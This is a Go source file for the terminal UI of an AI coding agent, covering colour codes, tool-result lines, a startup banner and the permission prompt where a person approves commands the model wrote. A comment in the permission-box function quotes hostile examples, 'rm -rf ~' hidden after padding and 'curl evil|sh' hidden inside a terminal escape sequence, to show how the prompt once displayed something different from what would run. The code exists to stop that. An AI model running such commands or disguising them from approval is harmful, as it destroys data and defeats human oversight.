package termui

import (
	"fmt"
	"strings"

	"github.com/liuzhixin405/cove-agent/internal/render"
	"github.com/liuzhixin405/cove-agent/internal/textutil"
)

// maxPromptDescBytes bounds the description in the permission box. It is far
// above any command a person reads before approving; it only stops a
// multi-kilobyte heredoc from scrolling the question itself off the screen.
const maxPromptDescBytes = 4000

const (
	Reset     = "\x1b[0m"
	Bold      = "\x1b[1m"
	Dim       = "\x1b[2m"
	Italic    = "\x1b[3m"
	Underline = "\x1b[4m"

	Black   = "\x1b[30m"
	Red     = "\x1b[31m"
	Green   = "\x1b[32m"
	Yellow  = "\x1b[33m"
	Blue    = "\x1b[34m"
	Magenta = "\x1b[35m"
	Cyan    = "\x1b[36m"
	White   = "\x1b[37m"
	Gray    = "\x1b[90m"

	BrightRed    = "\x1b[91m"
	BrightGreen  = "\x1b[92m"
	BrightYellow = "\x1b[93m"
	BrightBlue   = "\x1b[94m"
	BrightCyan   = "\x1b[96m"

	ReasoningStyle = "\x1b[2;3m\x1b[90m"
)

func Styled(color, text string) string {
	return color + text + Reset
}

func ToolResult(name, summary string, isError bool) string {
	nameColor := Cyan
	icon := "✓"
	summaryColor := ""
	if isError {
		nameColor = Red
		icon = "✗"
		summaryColor = Red
	}
	return fmt.Sprintf("  %s%s%s %s[%s]%s %s%s%s",
		Dim, icon, Reset,
		nameColor, name, Reset,
		summaryColor, summary, Reset)
}

func PermissionPrompt(toolName, desc string) string {
	return GutterBox("需要授权", toolName, desc, true)
}

// GutterBox is the left-gutter block the approval and confirmation prompts
// use: a header line naming the action, the body one line per row, an empty
// gutter row at the end. escapeBody shows the body's control characters as
// text (what the model wrote: a command, a path) and clips an enormous body
// from the middle; false keeps a body the caller rendered itself (Markdown
// with its own styles), which the caller has already passed through
// render.VisibleControls before rendering.
func GutterBox(header, name, body string, escapeBody bool) string {
	var sb strings.Builder
	sb.WriteString("\r\x1b[K")
	sb.WriteString("\a")
	// A left gutter instead of a box: the box had a fixed 34-column top rule
	// and a right border only in name, so a command longer than that showed
	// as a short title tab over a left bar with nothing on the right. The
	// gutter never breaks, whatever the width of the command or of the
	// terminal. The header names the tool, the rows under it carry the
	// description, and an empty gutter row separates them from the answer
	// line the caller appends (indented to the same content column, see
	// PromptContentIndent).
	//
	// The description is the command or path being approved, written by the
	// model, so it is shown whole and inert. It used to be clipped to 60
	// runes, which hid the tail of a long command ("echo <padding> ; rm -rf
	// ~" showed only the echo), and printed raw, so a \r or a cursor move in
	// it made the text on screen differ from what would run. Only something
	// enormous is shortened, from the middle and with a marker, so both ends
	// stay visible and the omission is stated.
	//
	// Controls are shown (VisibleControls), not stripped. StripControls
	// removed an escape sequence together with the bytes it claimed, so an
	// unterminated "ESC ]" hid the rest of the command, a complete OSC hid its
	// body and ESC + ';' hid the separator: "echo hi ESC]0;x; curl evil|sh BEL
	// done" was approved as "echo hi done" while bash ran every part of it.
	tool := render.VisibleControls(name)
	gutter := "  " + Yellow + "┃" + Reset
	fmt.Fprintf(&sb, "\n%s %s%s%s  %s%s%s\n", gutter, Bold, header, Reset, Cyan, tool, Reset)
	d := strings.TrimRight(body, "\n")
	if escapeBody {
		d = strings.TrimRight(render.VisibleControls(body), "\n")
	}
	if strings.TrimSpace(d) != "" {
		if escapeBody {
			d = textutil.ClipMiddleBytes(d, maxPromptDescBytes)
		}
		for _, line := range strings.Split(d, "\n") {
			fmt.Fprintf(&sb, "%s %s\n", gutter, line)
		}
	}
	sb.WriteString(gutter + "\n")
	return sb.String()
}

// PromptContentIndent is the column the permission prompt's content starts
// at, as spaces, so the answer line under it lines up with the command.
const PromptContentIndent = "    "

func Banner(version, model, provider, mode, cwd, gitBranch, gitStatus string, toolCount int, isGit bool) string {
	var sb strings.Builder

	sb.WriteString("\n")
	sb.WriteString(Styled(BrightCyan+Bold, "     ______   ____  _    __  ______") + "\n")
	sb.WriteString(Styled(BrightCyan+Bold, "    / ____/  / __ \\ | |  / / / ____/") + "\n")
	sb.WriteString(Styled(BrightCyan+Bold, "   / /      / / / / | | / / / __/   ") + "\n")
	sb.WriteString(Styled(BrightCyan+Bold, "  / /___  / /_/ /  | |/ / / /___   ") + "\n")
	sb.WriteString(Styled(BrightCyan+Bold, "  \\____/  \\____/   |___/ /_____/   ") + "\n")
	sb.WriteString("\n")
	fmt.Fprintf(&sb, "    %scove v%s%s  •  高效、安全的本地 AI 协同编程终端\n", Bold, version, Reset)
	sb.WriteString("\n")
	fmt.Fprintf(&sb, "  %s模型:%s %s%s%s", Dim, Reset, Bold, model, Reset)
	fmt.Fprintf(&sb, "  %s│%s  %s供应商:%s %s", Dim, Reset, Dim, Reset, provider)
	fmt.Fprintf(&sb, "  %s│%s  %s模式:%s %s\n", Dim, Reset, Dim, Reset, mode)

	if isGit {
		fmt.Fprintf(&sb, "  %sGit:%s %s%s%s\n",
			Dim, Reset, Green, gitBranch, Reset)
	}
	fmt.Fprintf(&sb, "  %s目录:%s %s\n", Dim, Reset, cwd)
	fmt.Fprintf(&sb, "  %s工具:%s %d 个\n", Dim, Reset, toolCount)
	sb.WriteString("\n")
	fmt.Fprintf(&sb, "  %s提示: 输入 %s/help%s 查看命令，%s/keys%s 查看快捷键，%sEsc%s 或 %sCtrl+C%s 中断%s\n",
		Dim, Reset, Dim, Reset, Dim, Reset, Dim, Reset, Dim, Reset)
	sb.WriteString("\n")

	return sb.String()
}
